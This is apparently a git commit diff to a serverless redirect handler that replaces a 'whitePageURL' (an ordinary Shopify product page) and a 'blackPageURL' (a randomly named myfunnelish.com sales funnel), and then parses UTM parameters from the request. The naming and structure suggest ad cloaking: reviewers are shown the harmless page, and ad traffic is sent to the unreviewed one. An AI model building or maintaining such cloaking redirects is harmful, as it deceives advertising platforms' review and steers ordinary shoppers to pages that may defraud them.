99a112739f11712aea2dc8874d03871a5b9fe65e
abdullahstackwise <aabdullahnaeem.rana@gmail.com>
2025-02-26 01:24:47 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://pinkpetals.pk/collections/new-arrivals/products/amber-gold?variant=46468169203935";
-    const blackPageURL = "https://cggkidswear.myfunnelish.com/super-active-toddler-jacket";
+    const whitePageURL = "https://draggydreamz.myshopify.com/products/best-hot-selling-cotton-blend-half-sleeves-t-shirt-for-men-white-l-cpshat9bgdj7apc252l0?variant=50262108242201";
+    const blackPageURL = "https://suqiqwopzxkasuewq.myfunnelish.com/jj-dd-spr-1738364604529104-1738364997483090-1739239513447558";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
